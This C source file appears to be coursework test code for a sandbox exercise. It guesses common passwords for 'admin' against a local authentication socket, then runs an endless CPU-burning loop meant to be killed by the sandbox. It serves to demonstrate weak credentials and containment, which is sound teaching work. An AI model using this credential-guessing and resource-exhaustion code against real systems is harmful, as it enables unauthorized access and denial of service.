/*
 * malicious_client.c  -  the binary that connects Task 1 and Task 2.
 *
 * This is a HOSTILE program. It does two things:
 *   Phase 1: it attacks the Task 1 authentication server. It connects to the
 *            same UNIX socket the real frontend uses (/tmp/auth_socket, from
 *            common.h) and tries a list of guessed passwords for "admin".
 *   Phase 2: it goes rogue - an infinite CPU loop that never stops on its own,
 *            the kind of runaway process a sandbox is meant to contain.
 *
 * Run it BARE and it attacks the login server and then hangs the machine.
 * Run it UNDER the Task 2 sandbox and the sandbox kills it (SIGKILL) and logs
 * the containment. Same binary, two outcomes - that is the interconnection.
 *
 * Build (inside ~/Task1, because it needs common.h):
 *     gcc -Wall -Wextra malicious_client.c -o test_binary
 * then hand "test_binary" to your Task 2 sandbox exactly like before.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>

#include "common.h"   /* reuse Task 1's protocol: LoginRequest, SOCKET_PATH, sizes */

/* Passwords an attacker would try against "admin". "Password123" is in the
 * list on purpose: if your backend is running, one guess will actually crack
 * it, which is the point the report makes about weak, hard-coded credentials. */
static const char *guesses[] = {
    "123456", "admin", "password", "root",
    "letmein", "Password123", "qwerty", "toor"
};

int main(void)
{
    printf("[malware] started, pid = %d\n", getpid());
    printf("[malware] Phase 1: attacking Task 1 auth server at %s\n", SOCKET_PATH);
    fflush(stdout);

    int total = sizeof(guesses) / sizeof(guesses[0]);

    for (int i = 0; i < total; i++) {
        int fd = socket(AF_UNIX, SOCK_STREAM, 0);
        if (fd < 0) {
            perror("[malware] socket");
            break;
        }

        struct sockaddr_un addr;
        memset(&addr, 0, sizeof(addr));
        addr.sun_family = AF_UNIX;
        strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);

        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            printf("[malware] attempt %d: auth server not reachable, "
                   "moving on\n", i + 1);
            close(fd);
            break;   /* backend serves one client then exits - stop probing */
        }

        LoginRequest req;
        memset(&req, 0, sizeof(req));
        strncpy(req.username, "admin", USERNAME_SIZE - 1);
        strncpy(req.password, guesses[i], PASSWORD_SIZE - 1);
        write(fd, &req, sizeof(req));

        char response[RESPONSE_SIZE];
        memset(response, 0, sizeof(response));
        read(fd, response, sizeof(response));
        printf("[malware] guess %d: admin / %-12s -> %s\n",
               i + 1, guesses[i], response);
        fflush(stdout);
        close(fd);

        if (strcmp(response, "SUCCESS") == 0) {
            printf("[malware] *** CREDENTIALS CRACKED: admin / %s ***\n",
                   guesses[i]);
            break;
        }
    }

    printf("[malware] Phase 2: going rogue - infinite CPU abuse.\n");
    printf("[malware] I will never stop on my own. Contain me if you can.\n");
    fflush(stdout);

    /* Runaway payload: burn CPU forever. The Task 2 sandbox's time limit and
     * SIGKILL are what stop this. Run bare, it never returns. */
    unsigned long x = 0;
    while (1) {
        x++;
        if ((x % 500000000UL) == 0) {
            printf("[malware] still running, still uncontained... (%lu)\n", x);
            fflush(stdout);
        }
    }

    return 0;   /* never reached */
}
